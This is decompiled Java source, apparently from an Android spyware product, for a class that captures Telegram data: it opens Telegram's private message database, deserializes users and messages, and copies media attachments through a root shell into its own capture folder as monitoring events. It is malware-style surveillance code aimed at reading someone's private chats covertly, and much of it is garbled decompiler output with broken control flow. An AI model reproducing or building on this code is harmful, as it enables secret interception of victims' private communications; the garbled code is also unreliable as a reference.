package com.vvt.capture.telegram;

import android.os.SystemClock;
import android.webkit.MimeTypeMap;
import com.vvt.base.RunningMode;
import com.vvt.capture.telegram.internal.AbstractSerializedData;
import com.vvt.capture.telegram.internal.ByteBufferDesc;
import com.vvt.capture.telegram.internal.SQLite.SQLiteCursor;
import com.vvt.capture.telegram.internal.SQLite.SQLiteDatabase;
import com.vvt.capture.telegram.internal.TLRPC.Document;
import com.vvt.capture.telegram.internal.TLRPC.DocumentAttribute;
import com.vvt.capture.telegram.internal.TLRPC.FileLocation;
import com.vvt.capture.telegram.internal.TLRPC.GeoPoint;
import com.vvt.capture.telegram.internal.TLRPC.Message;
import com.vvt.capture.telegram.internal.TLRPC.MessageMedia;
import com.vvt.capture.telegram.internal.TLRPC.Peer;
import com.vvt.capture.telegram.internal.TLRPC.TL_messageMediaContact;
import com.vvt.capture.telegram.internal.TLRPC.TL_messageMediaEmpty;
import com.vvt.capture.telegram.internal.TLRPC.TL_messageMediaWebPage;
import com.vvt.capture.telegram.internal.TLRPC.User;
import com.vvt.capture.telegram.internal.TLRPC.UserProfilePhoto;
import com.vvt.events.FxEventDirection;
import com.vvt.events.FxIMAccountEvent;
import com.vvt.events.FxIMContactEvent;
import com.vvt.events.FxIMConversationEvent;
import com.vvt.events.FxIMMessageEvent;
import com.vvt.events.FxIMMessageServiceType;
import com.vvt.im.events.ImMediaFileType;
import com.vvt.im.events.ImType;
import com.vvt.im.events.MessageType;
import com.vvt.im.events.info.f;
import com.vvt.io.p;
import com.vvt.shell.ShellUtil;
import java.io.File;
import java.io.UnsupportedEncodingException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;

public class b
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  
  /* Error */
  public static long a(int paramInt, String paramString1, String paramString2)
  {
    // Byte code:
    //   0: iconst_m1
    //   1: i2l
    //   2: lstore_3
    //   3: aconst_null
    //   4: astore 5
    //   6: aload_1
    //   7: ifnonnull +7 -> 14
    //   10: invokestatic 22	com/vvt/capture/telegram/d:a	()Ljava/lang/String;
    //   13: astore_1
    //   14: aload_1
    //   15: invokestatic 27	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   18: istore 6
    //   20: iload 6
    //   22: ifne +346 -> 368
    //   25: aload_1
    //   26: aload_2
    //   27: invokestatic 33	com/vvt/capture/telegram/internal/SQLite/SQLiteDatabase:getReadableDatabase	(Ljava/lang/String;Ljava/lang/String;)Lcom/vvt/capture/telegram/internal/SQLite/SQLiteDatabase;
    //   30: astore 7
    //   32: aload 7
    //   34: ifnull +322 -> 356
    //   37: iconst_m1
    //   38: istore 6
    //   40: iload_0
    //   41: iload 6
    //   43: if_icmpeq +313 -> 356
    //   46: getstatic 38	com/vvt/capture/telegram/MyUncaughtExceptionHandler:e	Ljava/lang/String;
    //   49: astore 8
    //   51: iconst_1
    //   52: istore 9
    //   54: iload 9
    //   56: anewarray 4	java/lang/Object
    //   59: astore 10
    //   61: iload_0
    //   62: invokestatic 45	java/lang/Integer:valueOf	(I)Ljava/lang/Integer;
    //   65: astore 11
    //   67: aload 10
    //   69: iconst_0
    //   70: aload 11
    //   72: aastore
    //   73: aload 7
    //   75: aload 8
    //   77: aload 10
    //   79: invokevirtual 49	com/vvt/capture/telegram/internal/SQLite/SQLiteDatabase:queryFinalized	(Ljava/lang/String;[Ljava/lang/Object;)Lcom/vvt/capture/telegram/internal/SQLite/SQLiteCursor;
    //   82: astore 5
    //   84: aload 5
    //   86: ifnull +260 -> 346
    //   89: aload 5
    //   91: invokevirtual 55	com/vvt/capture/telegram/internal/SQLite/SQLiteCursor:next	()Z
    //   94: istore 6
    //   96: iload 6
    //   98: ifeq +58 -> 156
    //   101: iconst_0
    //   102: istore 6
    //   104: aconst_null
    //   105: astore 8
    //   107: aload 5
    //   109: iconst_0
    //   110: invokevirtual 59	com/vvt/capture/telegram/internal/SQLite/SQLiteCursor:longValue	(I)J
    //   113: lstore 12
    //   115: lload 12
    //   117: lstore 14
    //   119: aload 5
    //   121: astore 10
    //   123: getstatic 12	com/vvt/capture/telegram/removeFromPath:a	Z
    //   126: istore 16
    //   128: iload 16
    //   130: ifeq +3 -> 133
    //   133: aload 10
    //   135: ifnull +8 -> 143
    //   138: aload 10
    //   140: invokevirtual 63	com/vvt/capture/telegram/internal/SQLite/SQLiteCursor:dispose	()V
    //   143: aload 7
    //   145: ifnull +8 -> 153
    //   148: aload 7
    //   150: invokevirtual 66	com/vvt/capture/telegram/internal/SQLite/SQLiteDatabase:close	()V
    //   153: lload 14
    //   155: lreturn
    //   156: lconst_0
    //   157: lstore 12
    //   159: lload 12
    //   161: lstore 14
    //   163: aload 5
    //   165: astore 10
    //   167: goto -44 -> 123
    //   170: astore 8
    //   172: iconst_0
    //   173: istore 6
    //   175: aconst_null
    //   176: astore 8
    //   178: getstatic 17	com/vvt/capture/telegram/removeFromPath:removeFromPath	Z
    //   181: istore 17
    //   183: iload 17
    //   185: ifeq +3 -> 188
    //   188: aload 8
    //   190: ifnull +8 -> 198
    //   193: aload 8
    //   195: invokevirtual 63	com/vvt/capture/telegram/internal/SQLite/SQLiteCursor:dispose	()V
    //   198: aload 5
    //   200: ifnull +8 -> 208
    //   203: aload 5
    //   205: invokevirtual 66	com/vvt/capture/telegram/internal/SQLite/SQLiteDatabase:close	()V
    //   208: lload_3
    //   209: lstore 14
    //   211: goto -58 -> 153
    //   214: astore 8
    //   216: iconst_0
    //   217: istore 17
    //   219: aconst_null
    //   220: astore 7
    //   222: iconst_0
    //   223: istore 9
    //   225: aconst_null
    //   226: astore 10
    //   228: aload 8
    //   230: astore 5
    //   232: aload 10
    //   234: ifnull +8 -> 242
    //   237: aload 10
    //   239: invokevirtual 63	com/vvt/capture/telegram/internal/SQLite/SQLiteCursor:dispose	()V
    //   242: aload 7
    //   244: ifnull +8 -> 252
    //   247: aload 7
    //   249: invokevirtual 66	com/vvt/capture/telegram/internal/SQLite/SQLiteDatabase:close	()V
    //   252: aload 5
    //   254: athrow
    //   255: astore 8
    //   257: iconst_0
    //   258: istore 9
    //   260: aconst_null
    //   261: astore 10
    //   263: aload 8
    //   265: astore 5
    //   267: goto -35 -> 232
    //   270: astore 8
    //   272: aload 5
    //   274: astore 10
    //   276: aload 8
    //   278: astore 5
    //   280: goto -48 -> 232
    //   283: astore 5
    //   285: goto -53 -> 232
    //   288: astore 18
    //   290: aload 5
    //   292: astore 7
    //   294: aload 8
    //   296: astore 10
    //   298: aload 18
    //   300: astore 5
    //   302: goto -70 -> 232
    //   305: astore 8
    //   307: iconst_0
    //   308: istore 6
    //   310: aconst_null
    //   311: astore 8
    //   313: aload 7
    //   315: astore 5
    //   317: goto -139 -> 178
    //   320: astore 8
    //   322: aload 5
    //   324: astore 8
    //   326: aload 7
    //   328: astore 5
    //   330: goto -152 -> 178
    //   333: astore 5
    //   335: aload 7
    //   337: astore 5
    //   339: aload 10
    //   341: astore 8
    //   343: goto -165 -> 178
    //   346: aload 5
    //   348: astore 10
    //   350: lload_3
    //   351: lstore 14
    //   353: goto -230 -> 123
    //   356: iconst_0
    //   357: istore 9
    //   359: aconst_null
    //   360: astore 10
    //   362: lload_3
    //   363: lstore 14
    //   365: goto -242 -> 123
    //   368: lload_3
    //   369: lstore 14
    //   371: goto -218 -> 153
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	374	0	paramInt	int
    //   0	374	1	paramString1	String
    //   0	374	2	paramString2	String
    //   2	367	3	l1	long
    //   4	275	5	localObject1	Object
    //   283	8	5	localObject2	Object
    //   300	29	5	localObject3	Object
    //   333	1	5	localException1	Exception
    //   337	10	5	localObject4	Object
    //   18	3	6	bool1	boolean
    //   38	6	6	i	int
    //   94	215	6	bool2	boolean
    //   30	306	7	localObject5	Object
    //   49	57	8	str	String
    //   170	1	8	localException2	Exception
    //   176	18	8	localObject6	Object
    //   214	15	8	localObject7	Object
    //   255	9	8	localObject8	Object
    //   270	25	8	localObject9	Object
    //   305	1	8	localException3	Exception
    //   311	1	8	localObject10	Object
    //   320	1	8	localException4	Exception
    //   324	18	8	localObject11	Object
    //   52	306	9	j	int
    //   59	302	10	localObject12	Object
    //   65	6	11	localInteger	Integer
    //   113	47	12	l2	long
    //   117	253	14	l3	long
    //   126	3	16	bool3	boolean
    //   181	37	17	bool4	boolean
    //   288	11	18	localObject13	Object
    // Exception table:
    //   from	to	target	type
    //   26	30	170	java/lang/Exception
    //   26	30	214	finally
    //   46	49	255	finally
    //   54	59	255	finally
    //   61	65	255	finally
    //   70	73	255	finally
    //   77	82	255	finally
    //   89	94	270	finally
    //   109	113	270	finally
    //   123	126	283	finally
    //   178	181	288	finally
    //   46	49	305	java/lang/Exception
    //   54	59	305	java/lang/Exception
    //   61	65	305	java/lang/Exception
    //   70	73	305	java/lang/Exception
    //   77	82	305	java/lang/Exception
    //   89	94	320	java/lang/Exception
    //   109	113	320	java/lang/Exception
    //   123	126	333	java/lang/Exception
  }
  
  public static long a(String paramString1, String paramString2)
  {
    l1 = -1;
    boolean bool1 = false;
    localSQLiteCursor = null;
    bool2 = a;
    if (bool2) {}
    bool2 = a;
    if (bool2) {}
    for (;;)
    {
      try
      {
        bool2 = com.vvt.ag.b.a(paramString1);
        if (bool2) {
          paramString1 = d.a();
        }
        bool2 = com.vvt.ag.b.a(paramString1);
        if (bool2) {
          continue;
        }
        bool2 = a;
        if (bool2) {}
        localSQLiteDatabase = SQLiteDatabase.getReadableDatabase(paramString1, paramString2);
        if (localSQLiteDatabase == null) {}
      }
      finally
      {
        SQLiteDatabase localSQLiteDatabase;
        boolean bool3;
        Object localObject3;
        boolean bool4;
        Object[] arrayOfObject;
        long l2;
        bool2 = false;
        Object localObject2 = null;
        try
        {
          bool3 = b;
          if ((!bool3) || (localSQLiteCursor != null)) {
            localSQLiteCursor.dispose();
          }
          if (localObject2 == null) {
            continue;
          }
          continue;
        }
        finally {}
        if (localSQLiteCursor != null) {
          localSQLiteCursor.dispose();
        }
        if (localObject2 != null) {
          ((SQLiteDatabase)localObject2).close();
        }
        Object localObject5;
        throw ((Throwable)localObject5);
        bool2 = false;
        localObject2 = null;
        continue;
      }
      try
      {
        bool3 = a;
        if (bool3) {}
        localObject3 = c.c;
        bool4 = false;
        arrayOfObject = null;
        arrayOfObject = new Object[0];
        localSQLiteCursor = localSQLiteDatabase.queryFinalized((String)localObject3, arrayOfObject);
        bool3 = true;
        localObject3 = Boolean.valueOf(bool3);
        bool4 = true;
        d.a((Boolean)localObject3, paramString2, bool4);
        if (localSQLiteCursor != null)
        {
          bool3 = localSQLiteCursor.next();
          if (!bool3) {
            continue;
          }
          bool3 = false;
          localObject3 = null;
          l2 = localSQLiteCursor.longValue(0);
          boolean bool5 = a;
          if (!bool5) {
            continue;
          }
          l1 = l2;
        }
      }
      finally
      {
        continue;
        l1 = l2;
        continue;
      }
      if (localSQLiteCursor != null) {
        localSQLiteCursor.dispose();
      }
      if (localSQLiteDatabase != null) {
        localSQLiteDatabase.close();
      }
      bool1 = a;
      if (bool1) {}
      bool1 = a;
      if (bool1) {}
      return l1;
      l1 = 0L;
    }
  }
  
  /* Error */
  private static TLRPC.User a(File paramFile)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_1
    //   2: iconst_0
    //   3: istore_2
    //   4: aconst_null
    //   5: astore_3
    //   6: invokestatic 85	javax/xml/parsers/DocumentBuilderFactory:newInstance	()Ljavax/xml/parsers/DocumentBuilderFactory;
    //   9: astore 4
    //   11: new 87	java/io/FileInputStream
    //   14: astore 5
    //   16: aload 5
    //   18: aload_0
    //   19: invokespecial 91	java/io/FileInputStream:<init>	(Ljava/io/File;)V
    //   22: aload 4
    //   24: invokevirtual 95	javax/xml/parsers/DocumentBuilderFactory:newDocumentBuilder	()Ljavax/xml/parsers/DocumentBuilder;
    //   27: astore 4
    //   29: new 97	org/xml/sax/InputSource
    //   32: astore 6
    //   34: aload 6
    //   36: aload 5
    //   38: invokespecial 100	org/xml/sax/InputSource:<init>	(Ljava/io/InputStream;)V
    //   41: aload 4
    //   43: aload 6
    //   45: invokevirtual 106	javax/xml/parsers/DocumentBuilder:parse	(Lorg/xml/sax/InputSource;)Lorg/w3c/dom/Document;
    //   48: astore 4
    //   50: aload 4
    //   52: invokeinterface 112 1 0
    //   57: astore 6
    //   59: aload 6
    //   61: invokeinterface 117 1 0
    //   66: ldc 119
    //   68: astore 6
    //   70: aload 4
    //   72: aload 6
    //   74: invokeinterface 123 2 0
    //   79: astore 4
    //   81: aload 4
    //   83: invokeinterface 129 1 0
    //   88: istore 7
    //   90: iload_2
    //   91: iload 7
    //   93: if_icmpge +185 -> 278
    //   96: aload 4
    //   98: iload_2
    //   99: invokeinterface 133 2 0
    //   104: astore 8
    //   106: aload 8
    //   108: invokeinterface 139 1 0
    //   113: astore 9
    //   115: ldc -115
    //   117: astore 10
    //   119: aload 9
    //   121: aload 10
    //   123: invokeinterface 147 2 0
    //   128: astore 9
    //   130: aload 9
    //   132: invokeinterface 150 1 0
    //   137: astore 9
    //   139: ldc -104
    //   141: astore 10
    //   143: aload 9
    //   145: aload 10
    //   147: invokevirtual 158	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   150: istore 11
    //   152: iload 11
    //   154: ifeq +78 -> 232
    //   157: aload 8
    //   159: invokeinterface 162 1 0
    //   164: astore_3
    //   165: aload_3
    //   166: invokeinterface 150 1 0
    //   171: astore_3
    //   172: aload_3
    //   173: ifnull +52 -> 225
    //   176: aconst_null
    //   177: astore 4
    //   179: aload_3
    //   180: iconst_0
    //   181: invokestatic 168	android/util/Base64:decode	(Ljava/lang/String;I)[B
    //   184: astore_3
    //   185: aload_3
    //   186: ifnull +39 -> 225
    //   189: new 170	com/vvt/capture/telegram/internal/SerializedData
    //   192: astore 4
    //   194: aload 4
    //   196: aload_3
    //   197: invokespecial 173	com/vvt/capture/telegram/internal/SerializedData:<init>	([B)V
    //   200: iconst_0
    //   201: istore_2
    //   202: aconst_null
    //   203: astore_3
    //   204: aload 4
    //   206: iconst_0
    //   207: invokevirtual 177	com/vvt/capture/telegram/internal/SerializedData:readInt32	(Z)I
    //   210: istore_2
    //   211: iconst_0
    //   212: istore 7
    //   214: aconst_null
    //   215: astore 6
    //   217: aload 4
    //   219: iload_2
    //   220: iconst_0
    //   221: invokestatic 183	com/vvt/capture/telegram/internal/TLRPC$User:TLdeserialize	(Lcom/vvt/capture/telegram/internal/AbstractSerializedData;IZ)Lcom/vvt/capture/telegram/internal/TLRPC$User;
    //   224: astore_1
    //   225: aload 5
    //   227: invokestatic 187	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   230: aload_1
    //   231: areturn
    //   232: iload_2
    //   233: iconst_1
    //   234: iadd
    //   235: istore_2
    //   236: goto -146 -> 90
    //   239: astore 5
    //   241: aconst_null
    //   242: astore 5
    //   244: getstatic 17	com/vvt/capture/telegram/removeFromPath:removeFromPath	Z
    //   247: istore_2
    //   248: iload_2
    //   249: ifeq -24 -> 225
    //   252: goto -27 -> 225
    //   255: astore 12
    //   257: aconst_null
    //   258: astore 5
    //   260: aload 12
    //   262: astore_1
    //   263: aload 5
    //   265: invokestatic 187	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   268: aload_1
    //   269: athrow
    //   270: astore_1
    //   271: goto -8 -> 263
    //   274: astore_3
    //   275: goto -31 -> 244
    //   278: iconst_0
    //   279: istore_2
    //   280: aconst_null
    //   281: astore_3
    //   282: goto -110 -> 172
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	285	0	paramFile	File
    //   1	268	1	localObject1	Object
    //   270	1	1	localObject2	Object
    //   3	233	2	i	int
    //   247	33	2	bool1	boolean
    //   5	199	3	localObject3	Object
    //   274	1	3	localException1	Exception
    //   281	1	3	localObject4	Object
    //   9	209	4	localObject5	Object
    //   14	212	5	localFileInputStream	java.io.FileInputStream
    //   239	1	5	localException2	Exception
    //   242	22	5	localInputStream	java.io.InputStream
    //   32	184	6	localObject6	Object
    //   88	125	7	j	int
    //   104	54	8	localNode	org.w3c.dom.Node
    //   113	31	9	localObject7	Object
    //   117	29	10	str	String
    //   150	3	11	bool2	boolean
    //   255	6	12	localObject8	Object
    // Exception table:
    //   from	to	target	type
    //   11	14	239	java/lang/Exception
    //   18	22	239	java/lang/Exception
    //   11	14	255	finally
    //   18	22	255	finally
    //   22	27	270	finally
    //   29	32	270	finally
    //   36	41	270	finally
    //   43	48	270	finally
    //   50	57	270	finally
    //   59	66	270	finally
    //   72	79	270	finally
    //   81	88	270	finally
    //   98	104	270	finally
    //   106	113	270	finally
    //   121	128	270	finally
    //   130	137	270	finally
    //   145	150	270	finally
    //   157	164	270	finally
    //   165	171	270	finally
    //   180	184	270	finally
    //   189	192	270	finally
    //   196	200	270	finally
    //   206	210	270	finally
    //   220	224	270	finally
    //   244	247	270	finally
    //   22	27	274	java/lang/Exception
    //   29	32	274	java/lang/Exception
    //   36	41	274	java/lang/Exception
    //   43	48	274	java/lang/Exception
    //   50	57	274	java/lang/Exception
    //   59	66	274	java/lang/Exception
    //   72	79	274	java/lang/Exception
    //   81	88	274	java/lang/Exception
    //   98	104	274	java/lang/Exception
    //   106	113	274	java/lang/Exception
    //   121	128	274	java/lang/Exception
    //   130	137	274	java/lang/Exception
    //   145	150	274	java/lang/Exception
    //   157	164	274	java/lang/Exception
    //   165	171	274	java/lang/Exception
    //   180	184	274	java/lang/Exception
    //   189	192	274	java/lang/Exception
    //   196	200	274	java/lang/Exception
    //   206	210	274	java/lang/Exception
    //   220	224	274	java/lang/Exception
  }
  
  private static com.vvt.im.events.info.a a(SQLiteDatabase paramSQLiteDatabase, TelegramData paramTelegramData, TLRPC.Message paramMessage, String paramString, com.vvt.base.b paramb)
  {
    int i = 0;
    Object localObject1 = null;
    Object localObject2 = null;
    Object localObject4 = MessageType.none;
    int j = ((MessageType)localObject4).getNumber();
    try
    {
      localObject6 = paramMessage.media;
      localObject7 = d.a((TLRPC.MessageMedia)localObject6);
      localObject6 = "/";
      int k = ((String)localObject7).lastIndexOf((String)localObject6) + 1;
      localObject6 = ((String)localObject7).substring(k);
      m = a;
      if ((m != 0) && (paramMessage == null)) {
        break label673;
      }
      localObject8 = paramMessage.attachPath;
      if (localObject8 == null) {
        break label673;
      }
      localObject8 = paramMessage.attachPath;
      paramMessage.attachPath = ((String)localObject8);
      localObject9 = new java/io/File;
      localObject8 = paramMessage.attachPath;
      ((File)localObject9).<init>((String)localObject8);
      m = ((File)localObject9).exists();
      if (m == 0)
      {
        localObject9 = new java/io/File;
        localObject8 = paramMessage.attachPath;
        localObject8 = com.vvt.io.d.h((String)localObject8);
        ((File)localObject9).<init>((String)localObject8);
      }
      localObject8 = new java/io/File;
      ((File)localObject8).<init>((String)localObject7);
      localObject7 = new java/io/File;
      str = c.f;
      str = p.a(str, (String)localObject6);
      str = com.vvt.io.d.h(str);
      ((File)localObject7).<init>(str);
      boolean bool4 = a;
      if (bool4) {}
      bool4 = ((File)localObject8).exists();
      if (!bool4) {
        break label681;
      }
    }
    catch (Exception localException2)
    {
      for (;;)
      {
        Object localObject6;
        Object localObject7;
        int m;
        Object localObject8;
        Object localObject9;
        String str;
        label217:
        boolean bool5;
        boolean bool7;
        label323:
        long l;
        boolean bool1;
        int n;
        boolean bool6;
        label622:
        label673:
        label681:
        boolean bool3;
        label719:
        label744:
        boolean bool2 = b;
        if (bool2)
        {
          continue;
          bool2 = false;
          Object localObject5 = null;
          continue;
          bool3 = bool2;
          continue;
          bool3 = false;
          localObject8 = null;
        }
      }
    }
    if (localObject8 != null)
    {
      bool5 = a;
      if (bool5) {}
      bool5 = ((File)localObject8).exists();
      if (bool5)
      {
        localObject9 = a((String)localObject6);
        if (localObject9 != null)
        {
          localObject7 = "audio";
          bool7 = ((String)localObject9).contains((CharSequence)localObject7);
          if (!bool7)
          {
            localObject7 = ((File)localObject8).getAbsolutePath();
            str = ".ogg";
            bool7 = ((String)localObject7).contains(str);
            if (!bool7) {}
          }
          else
          {
            i = 2;
          }
          localObject7 = "video";
          bool7 = ((String)localObject9).contains((CharSequence)localObject7);
          if (!bool7) {
            break label719;
          }
          i = 3;
        }
        l = ((File)localObject8).length();
        bool1 = a(i, paramb, l);
        if (bool1)
        {
          localObject1 = ((File)localObject8).getAbsolutePath();
          localObject8 = "webp";
          m = ((String)localObject1).contains((CharSequence)localObject8);
          if (m == 0) {
            break label903;
          }
          localObject4 = MessageType.Sticker;
          j = ((MessageType)localObject4).getNumber();
          m = j;
          if (paramMessage != null)
          {
            localObject4 = paramMessage.media;
            if (localObject4 != null)
            {
              localObject4 = paramMessage.media;
              localObject4 = ((TLRPC.MessageMedia)localObject4).document;
              if (localObject4 != null)
              {
                localObject4 = paramMessage.media;
                localObject4 = ((TLRPC.MessageMedia)localObject4).document;
                localObject4 = ((TLRPC.Document)localObject4).attributes;
                if (localObject4 != null)
                {
                  n = ((ArrayList)localObject4).size();
                  if (n > 0)
                  {
                    n = 0;
                    localObject9 = null;
                    localObject4 = ((ArrayList)localObject4).get(0);
                    localObject4 = (TLRPC.DocumentAttribute)localObject4;
                    if (localObject4 != null)
                    {
                      localObject9 = ((TLRPC.DocumentAttribute)localObject4).file_name;
                      bool6 = com.vvt.ag.b.a((String)localObject9);
                      if (!bool6) {
                        localObject6 = ((TLRPC.DocumentAttribute)localObject4).file_name;
                      }
                    }
                    bool2 = a;
                    if (!bool2) {}
                  }
                }
              }
            }
          }
          bool2 = com.vvt.ag.b.a((String)localObject1);
          if (bool2) {
            break label744;
          }
          localObject4 = ".webp";
          bool2 = ((String)localObject1).endsWith((String)localObject4);
          if (!bool2) {
            break label744;
          }
          bool2 = ShellUtil.b((String)localObject1);
          if (!bool2) {
            break label744;
          }
          bool2 = a;
          if (bool2) {}
          localObject4 = paramb.f();
          localObject4 = a((String)localObject1, paramString, (String)localObject4);
          bool1 = com.vvt.ag.b.a((String)localObject4);
          if (bool1) {
            break label894;
          }
          localObject6 = com.vvt.io.d.k((String)localObject4);
          localObject1 = "image/bmp";
          localObject1 = localObject6;
          localObject6 = localObject4;
          localObject4 = new com/vvt/im/events/info/a;
          ((com.vvt.im.events.info.a)localObject4).<init>();
        }
      }
    }
    for (;;)
    {
      try
      {
        localObject2 = a((String)localObject1);
        ((com.vvt.im.events.info.a)localObject4).b((String)localObject2);
        ((com.vvt.im.events.info.a)localObject4).c((String)localObject6);
        ((com.vvt.im.events.info.a)localObject4).a((String)localObject1);
        paramTelegramData.a(m);
        localObject2 = localObject4;
        return (com.vvt.im.events.info.a)localObject2;
      }
      catch (Exception localException1)
      {
        Object localObject3 = localException2;
        continue;
      }
      localObject8 = "";
      break;
      bool3 = ((File)localObject9).exists();
      if (bool3)
      {
        localObject8 = localObject9;
        break label217;
      }
      bool3 = ((File)localObject7).exists();
      if (!bool3) {
        break label910;
      }
      localObject8 = localObject7;
      break label217;
      localObject7 = "image";
      bool6 = ((String)localObject9).contains((CharSequence)localObject7);
      if (!bool6) {
        break label323;
      }
      bool1 = true;
      break label323;
      localObject4 = new java/lang/StringBuilder;
      ((StringBuilder)localObject4).<init>();
      localObject9 = ImType.TELEGRAM;
      localObject7 = ImMediaFileType.ATTACHMENT;
      localObject9 = com.vvt.im.a.c.a(paramString, (ImType)localObject9, (ImMediaFileType)localObject7);
      localObject4 = ((StringBuilder)localObject4).append((String)localObject9);
      localObject9 = File.separator;
      localObject4 = ((StringBuilder)localObject4).append((String)localObject9);
      localObject9 = ImMediaFileType.ATTACHMENT;
      localObject9 = com.vvt.im.a.c.a((ImMediaFileType)localObject9);
      localObject4 = ((StringBuilder)localObject4).append((String)localObject9);
      localObject4 = ((StringBuilder)localObject4).toString();
      ShellUtil.a((String)localObject1, (String)localObject4);
      localObject1 = paramb.f();
      ShellUtil.b((String)localObject1, (String)localObject4);
      localObject1 = localObject6;
      localObject6 = localObject4;
      break label622;
      bool2 = b;
      if (!bool2) {}
    }
  }
  
  /* Error */
  private static com.vvt.im.events.info.e a(SQLiteDatabase paramSQLiteDatabase, String paramString1, String paramString2, String paramString3)
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore 4
    //   3: aconst_null
    //   4: astore 5
    //   6: getstatic 373	com/vvt/capture/telegram/MyUncaughtExceptionHandler:a	Ljava/lang/String;
    //   9: astore 6
    //   11: iconst_1
    //   12: istore 7
    //   14: iload 7
    //   16: anewarray 4	java/lang/Object
    //   19: astore 8
    //   21: aconst_null
    //   22: astore 9
    //   24: aload 8
    //   26: iconst_0
    //   27: aload_1
    //   28: aastore
    //   29: aload_0
    //   30: aload 6
    //   32: aload 8
    //   34: invokevirtual 49	com/vvt/capture/telegram/internal/SQLite/SQLiteDatabase:queryFinalized	(Ljava/lang/String;[Ljava/lang/Object;)Lcom/vvt/capture/telegram/internal/SQLite/SQLiteCursor;
    //   37: astore 8
    //   39: aload 8
    //   41: invokevirtual 55	com/vvt/capture/telegram/internal/SQLite/SQLiteCursor:next	()Z
    //   44: istore 10
    //   46: iload 10
    //   48: ifeq +277 -> 325
    //   51: iconst_0
    //   52: istore 10
    //   54: aconst_null
    //   55: astore 6
    //   57: aload 8
    //   59: iconst_0
    //   60: invokevirtual 376	com/vvt/capture/telegram/internal/SQLite/SQLiteCursor:stringValue	(I)Ljava/lang/String;
    //   63: astore 9
    //   65: iconst_1
    //   66: istore 10
    //   68: aload 8
    //   70: iload 10
    //   72: invokevirtual 380	com/vvt/capture/telegram/internal/SQLite/SQLiteCursor:byteArrayValue	(I)[B
    //   75: astore 6
    //   77: new 382	com/vvt/capture/telegram/internal/ByteBufferDesc
    //   80: astore 11
    //   82: aload 11
    //   84: aload 6
    //   86: invokespecial 383	com/vvt/capture/telegram/internal/ByteBufferDesc:<init>	([B)V
    //   89: iconst_0
    //   90: istore 10
    //   92: aconst_null
    //   93: astore 6
    //   95: aload 11
    //   97: iconst_0
    //   98: invokevirtual 384	com/vvt/capture/telegram/internal/ByteBufferDesc:readInt32	(Z)I
    //   101: istore 10
    //   103: aload 11
    //   105: iload 10
    //   107: iconst_0
    //   108: invokestatic 183	com/vvt/capture/telegram/internal/TLRPC$User:TLdeserialize	(Lcom/vvt/capture/telegram/internal/AbstractSerializedData;IZ)Lcom/vvt/capture/telegram/internal/TLRPC$User;
    //   111: astore 11
    //   113: new 386	com/vvt/im/events/info/e
    //   116: astore 6
    //   118: aload 6
    //   120: invokespecial 387	com/vvt/im/events/info/e:<init>	()V
    //   123: aload 6
    //   125: aload_1
    //   126: invokevirtual 390	com/vvt/im/events/info/e:d	(Ljava/lang/String;)V
    //   129: ldc_w 392
    //   132: astore 5
    //   134: aload 9
    //   136: aload 5
    //   138: invokevirtual 396	java/lang/String:split	(Ljava/lang/String;)[Ljava/lang/String;
    //   141: astore 5
    //   143: aload 5
    //   145: arraylength
    //   146: istore 4
    //   148: iload 4
    //   150: ifeq +77 -> 227
    //   153: ldc_w 392
    //   156: astore 5
    //   158: aload 9
    //   160: aload 5
    //   162: invokevirtual 396	java/lang/String:split	(Ljava/lang/String;)[Ljava/lang/String;
    //   165: astore 5
    //   167: aconst_null
    //   168: astore 9
    //   170: aload 5
    //   172: iconst_0
    //   173: aaload
    //   174: astore 5
    //   176: aload 6
    //   178: aload 5
    //   180: invokevirtual 397	com/vvt/im/events/info/e:MyUncaughtExceptionHandler	(Ljava/lang/String;)V
    //   183: aload 11
    //   185: aload_2
    //   186: aload_3
    //   187: invokestatic 400	com/vvt/capture/telegram/removeFromPath:a	(Lcom/vvt/capture/telegram/internal/TLRPC$User;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   190: astore 5
    //   192: aload 5
    //   194: ifnull +10 -> 204
    //   197: aload 6
    //   199: aload 5
    //   201: invokevirtual 401	com/vvt/im/events/info/e:a	(Ljava/lang/String;)V
    //   204: getstatic 12	com/vvt/capture/telegram/removeFromPath:a	Z
    //   207: istore 4
    //   209: iload 4
    //   211: ifeq +3 -> 214
    //   214: aload 8
    //   216: ifnull +8 -> 224
    //   219: aload 8
    //   221: invokevirtual 63	com/vvt/capture/telegram/internal/SQLite/SQLiteCursor:dispose	()V
    //   224: aload 6
    //   226: areturn
    //   227: ldc_w 403
    //   230: astore 5
    //   232: goto -56 -> 176
    //   235: astore 6
    //   237: iconst_0
    //   238: istore 10
    //   240: aconst_null
    //   241: astore 6
    //   243: getstatic 17	com/vvt/capture/telegram/removeFromPath:removeFromPath	Z
    //   246: istore 7
    //   248: iload 7
    //   250: ifeq +3 -> 253
    //   253: aload 5
    //   255: ifnull -31 -> 224
    //   258: aload 5
    //   260: invokevirtual 63	com/vvt/capture/telegram/internal/SQLite/SQLiteCursor:dispose	()V
    //   263: goto -39 -> 224
    //   266: astore 6
    //   268: iconst_0
    //   269: istore 7
    //   271: aconst_null
    //   272: astore 8
    //   274: aload 8
    //   276: ifnull +8 -> 284
    //   279: aload 8
    //   281: invokevirtual 63	com/vvt/capture/telegram/internal/SQLite/SQLiteCursor:dispose	()V
    //   284: aload 6
    //   286: athrow
    //   287: astore 6
    //   289: goto -15 -> 274
    //   292: astore 6
    //   294: aload 5
    //   296: astore 8
    //   298: goto -24 -> 274
    //   301: astore 6
    //   303: iconst_0
    //   304: istore 10
    //   306: aconst_null
    //   307: astore 6
    //   309: aload 8
    //   311: astore 5
    //   313: goto -70 -> 243
    //   316: astore 5
    //   318: aload 8
    //   320: astore 5
    //   322: goto -79 -> 243
    //   325: iconst_0
    //   326: istore 10
    //   328: aconst_null
    //   329: astore 6
    //   331: goto -117 -> 214
    // Local variable table:
    //   start	length	slot	name	signature
